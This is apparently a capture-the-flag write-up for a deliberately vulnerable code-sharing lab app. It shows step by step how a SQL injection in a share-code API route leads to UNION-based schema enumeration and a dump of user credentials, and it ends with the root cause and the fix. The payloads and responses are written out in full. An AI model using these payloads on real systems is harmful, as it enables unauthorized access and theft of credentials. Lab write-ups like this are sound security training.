# CopyPasta — SQL Injection Walkthrough

**Target:** `https://lab-1779909475152-b84hu1.labs-app.bugforge.io`
**App:** CopyPasta — code snippet sharing site (React SPA + Express + SQLite)
**Hint:** SQL Injection
**Flag:** `bug{DGvhH6USUCCnZ3GOfTEfzMYkeigPk8EX}`

---

## 1. Recon

Pulled the React bundle and grepped API routes:

```
/api/login
/api/register
/api/profile, /api/profile/password
/api/snippets, /api/snippets/public, /api/snippets/share/:code
/api/snippets/:id/like, /api/snippets/:id/comments
/api/verify-token
```

Login SQLi (`admin' OR '1'='1-- `, etc.) all returned `Invalid credentials` — login is sanitized.

Registered a throwaway user to get a JWT:

```bash
curl -X POST .../api/register -H 'Content-Type: application/json' \
  -d '{"username":"adntest123","password":"adntest123","email":"a@b.c"}'
```

Got token + role `user`.

## 2. Finding the injection

`GET /api/snippets/share/:code` looks up a snippet by its `share_code` column. Tried inserting a quote into the path:

```bash
curl ".../api/snippets/share/x%27%20OR%20%271%27%3D%271" -H "Authorization: Bearer $TOKEN"
```

Returned snippet id 1 — confirming the parameter is concatenated into the SQL, not parameterized.

## 3. UNION-based exfil

Probed column count with `UNION SELECT NULL,...`. The endpoint returned a JSON body keyed `id,title,code,language,description,username`, but **6 NULLs** was the only count that didn't 404 — the SELECT joins users, but the route's response shape masks the inner column count. Confirmed mapping with literals:

```
?share/x' UNION SELECT 1,2,3,4,5,6-- -
=> {"id":1,"title":2,"code":3,"language":4,"description":5,"username":6}
```

## 4. Schema enumeration

SQLite, so `sqlite_master`:

```sql
x' UNION SELECT 1,group_concat(name),3,4,5,6 FROM sqlite_master WHERE type='table'-- -
```

Tables: `users, sqlite_sequence, snippets, snippet_likes, snippet_comments`

Dumped CREATE statements — `users` has columns: `id, username, email, password, full_name, bio, role, created_at`.

## 5. Dump users

```sql
x' UNION SELECT id, username||':'||email||':'||password, full_name, bio, role, 6 FROM users-- -
```

Full payload:

```
GET /api/snippets/share/x%27%20UNION%20SELECT%20id%2Cusername%7C%7C%27%3A%27%7C%7Cemail%7C%7C%27%3A%27%7C%7Cpassword%2Cfull_name%2Cbio%2Crole%2C6%20FROM%20users--%20-
```

Response:

```json
{
  "id": 1,
  "title": "admin:admin@copypasta.com:bug{DGvhH6USUCCnZ3GOfTEfzMYkeigPk8EX}",
  "code": "Admin User",
  "language": "CopyPasta Administrator",
  "description": "admin",
  "username": 6
}
```

The flag was stored as the admin's password.

## Flag

```
bug{DGvhH6USUCCnZ3GOfTEfzMYkeigPk8EX}
```

## Root cause

`/api/snippets/share/:code` builds its SQL by string-concatenating `req.params.code` into the WHERE clause. Login was parameterized, so it resisted the obvious payloads — but the share lookup wasn't. Fix: bind `share_code` as a parameter.
